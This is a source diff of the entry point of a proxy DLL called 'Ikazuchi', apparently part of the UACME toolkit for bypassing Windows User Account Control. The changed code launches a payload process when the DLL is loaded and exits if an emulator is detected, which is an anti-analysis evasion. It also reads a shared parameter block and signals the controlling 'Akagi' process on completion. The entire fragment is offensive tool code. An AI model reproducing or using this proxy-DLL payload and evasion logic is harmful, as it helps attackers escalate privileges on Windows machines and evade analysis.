@@ -4,9 +4,9 @@
 *
 *  TITLE:       DLLMAIN.C
 *
-*  VERSION:     3.03
+*  VERSION:     3.10
 *
-*  DATE:        11 Oct 2018
+*  DATE:        11 Nov 2018
 *
 *  Proxy dll entry point, Ikazuchi.
 *
@@ -54,6 +54,9 @@ typedef HRESULT(WINAPI *pfnTaskDialogIndirect)(
     int  *pnRadioButton,
     BOOL *pfVerificationFlagChecked
     );
+
+UACME_PARAM_BLOCK g_SharedParams;
+
 
 /*
 * DummyFunc
@@ -191,41 +194,45 @@ BOOL WINAPI DllMain(
     _In_ LPVOID lpvReserved
 )
 {
-    BOOL bReadSuccess, bIsLocalSystem = FALSE;
-    PWSTR lpParameter = NULL;
-    ULONG cbParameter = 0L;
+    BOOL bSharedParamsReadOk;
+    PWSTR lpParameter;
+    ULONG cbParameter;
 
-    UNREFERENCED_PARAMETER(hinstDLL);
     UNREFERENCED_PARAMETER(lpvReserved);
 
     if (wdIsEmulatorPresent() != STATUS_NOT_SUPPORTED)
         ExitProcess('foff');
 
+    LdrDisableThreadCalloutsForDll(hinstDLL);
+
     if (fdwReason == DLL_PROCESS_ATTACH) {
 
         OutputDebugString(LoadedMsg);
 
-        ucmIsLocalSystem(&bIsLocalSystem);
-
-        bReadSuccess = ucmReadParameters(
-            &lpParameter,
-            &cbParameter,
-            NULL,
-            NULL,
-            bIsLocalSystem);
+        //
+        // Read shared params block.
+        //
+        RtlSecureZeroMemory(&g_SharedParams, sizeof(g_SharedParams));
+        bSharedParamsReadOk = ucmReadSharedParameters(&g_SharedParams);
+        if (bSharedParamsReadOk) {
+            lpParameter = g_SharedParams.szParameter;
+            cbParameter = (ULONG)(_strlen(g_SharedParams.szParameter) * sizeof(WCHAR));
+        }
+        else {
+            lpParameter = NULL;
+            cbParameter = 0UL;
+        }
 
         ucmLaunchPayloadEx(
             CreateProcessW,
             lpParameter,
             cbParameter);
 
-        if ((bReadSuccess) &&
-            (lpParameter != NULL))
-        {
-            RtlFreeHeap(
-                NtCurrentPeb()->ProcessHeap,
-                0,
-                lpParameter);
+        //
+        // Notify Akagi.
+        //
+        if (bSharedParamsReadOk) {
+            ucmSetCompletion(g_SharedParams.szSignalObject);
         }
 
     }
